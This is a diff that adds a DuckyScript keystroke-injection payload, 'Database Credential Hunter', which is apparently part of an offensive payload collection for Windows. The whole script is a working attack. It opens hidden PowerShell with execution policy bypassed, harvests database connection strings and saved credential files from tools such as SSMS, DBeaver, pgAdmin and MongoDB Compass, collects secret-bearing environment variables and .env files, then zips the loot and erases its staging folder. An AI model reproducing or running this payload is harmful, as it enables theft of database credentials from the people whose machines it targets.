@@ -1,0 +1,93 @@
+REM =============================================
+REM Title: Database Credential Hunter
+REM Author: bad-antics
+REM Description: Find database connection strings and creds
+REM Category: nullsec/exfil
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create loot directory
+STRING $d="$env:TEMP\dbloot";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Search for connection strings in common config files
+STRING $patterns=@("*.config","*.xml","*.json","*.ini","*.env","*.yaml","*.yml","appsettings*.json","web.config","app.config")
+ENTER
+DELAY 100
+
+STRING $searchPaths=@("$env:USERPROFILE\source","$env:USERPROFILE\Documents","$env:USERPROFILE\Projects","C:\inetpub","C:\Projects")
+ENTER
+DELAY 100
+
+REM Connection string patterns to find
+STRING $connPatterns="connectionString|Data Source|Server=|uid=|pwd=|password=|DATABASE_URL|MYSQL_|POSTGRES_|MONGO_|REDIS_"
+ENTER
+DELAY 100
+
+STRING foreach($path in $searchPaths){if(Test-Path $path){Get-ChildItem $path -Include $patterns -Recurse -ErrorAction SilentlyContinue|Select-String -Pattern $connPatterns -ErrorAction SilentlyContinue|Select -First 100|Out-File "$d\conn_strings.txt" -Append}}
+ENTER
+DELAY 1000
+
+REM SQL Server connection files
+STRING if(Test-Path "$env:APPDATA\Microsoft\SQL Server Management Studio"){cp -r "$env:APPDATA\Microsoft\SQL Server Management Studio" "$d\ssms" -Force 2>$null}
+ENTER
+DELAY 300
+
+REM MySQL Workbench
+STRING if(Test-Path "$env:APPDATA\MySQL\Workbench"){cp "$env:APPDATA\MySQL\Workbench\workbench_user_data.dat" "$d\mysql_workbench.dat" 2>$null;cp "$env:APPDATA\MySQL\Workbench\connections.xml" "$d\mysql_connections.xml" 2>$null}
+ENTER
+DELAY 200
+
+REM pgAdmin PostgreSQL
+STRING if(Test-Path "$env:APPDATA\pgAdmin"){cp -r "$env:APPDATA\pgAdmin" "$d\pgadmin" -Force 2>$null}
+ENTER
+DELAY 200
+
+REM DBeaver
+STRING if(Test-Path "$env:APPDATA\DBeaverData"){cp "$env:APPDATA\DBeaverData\workspace6\.metadata\.plugins\org.jkiss.dbeaver.core\credentials-config.json" "$d\dbeaver_creds.json" 2>$null;cp "$env:APPDATA\DBeaverData\workspace6\.metadata\.plugins\org.jkiss.dbeaver.core\data-sources.json" "$d\dbeaver_sources.json" 2>$null}
+ENTER
+DELAY 200
+
+REM Azure Data Studio
+STRING if(Test-Path "$env:APPDATA\azuredatastudio"){Get-ChildItem "$env:APPDATA\azuredatastudio" -Filter "*.json" -Recurse|%{cp $_.FullName "$d\ads_$($_.Name)" 2>$null}}
+ENTER
+DELAY 300
+
+REM MongoDB Compass
+STRING if(Test-Path "$env:APPDATA\MongoDB Compass"){cp "$env:APPDATA\MongoDB Compass\Connections\*" "$d\mongodb\" -Force 2>$null}
+ENTER
+DELAY 200
+
+REM Redis Desktop Manager
+STRING if(Test-Path "$env:USERPROFILE\.rdm"){cp "$env:USERPROFILE\.rdm\connections.json" "$d\redis_connections.json" 2>$null}
+ENTER
+DELAY 200
+
+REM Environment variables (may contain DB creds)
+STRING Get-ChildItem env:|Where-Object{$_.Value-match"password|secret|key|connection|database|mongo|mysql|postgres|redis"}|Out-File "$d\env_vars.txt"
+ENTER
+DELAY 200
+
+REM .env files in user directories
+STRING Get-ChildItem "$env:USERPROFILE" -Filter ".env*" -Recurse -Hidden -ErrorAction SilentlyContinue|%{cp $_.FullName "$d\env_$($_.Directory.Name)_$($_.Name)" 2>$null}
+ENTER
+DELAY 500
+
+REM Compress
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\dbcreds_$(hostname).zip" -Force
+ENTER
+DELAY 400
+
+STRING Remove-Item $d -Recurse -Force
+ENTER
+
+STRING exit
+ENTER
